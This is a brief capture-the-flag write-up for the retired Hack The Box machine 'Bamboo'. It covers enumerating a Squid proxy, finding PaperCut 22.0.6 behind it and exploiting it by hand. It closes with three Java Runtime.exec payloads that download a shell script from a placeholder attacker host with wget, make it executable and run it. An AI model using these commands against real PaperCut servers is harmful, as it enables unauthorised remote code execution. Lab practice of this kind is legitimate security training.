# Bamboo: Retired HTB Machine

## Enumeration

- Ports: 22,3128

Port 3128 runs squid proxy. So I used [this article](https://www.verylazytech.com/squid-port-3128) to pentest it.

Using [spose](https://github.com/aancw/spose) I discovered port 9191 was open through the proxy. So I used the proxy to access the page. 

This is running PaperCut 22.0.6, none of the exploits I checked on github worked so we had to manually exploit it. I used these 2 links:

- [Detect Exploit](https://www.exploit-db.com/exploits/51452)
- [Run The RCE](https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software)

Now the standard RCE won't work here, so you will have to execute each of these steps separately.

1. `java.lang.Runtime.getRuntime().exec("wget --content-disposition http://<ip>:<port>/shell.sh");`
2. `java.lang.Runtime.getRuntime().exec("chmod +x shell.sh");`
3. `java.lang.Runtime.getRuntime().exec("./shell.sh");`


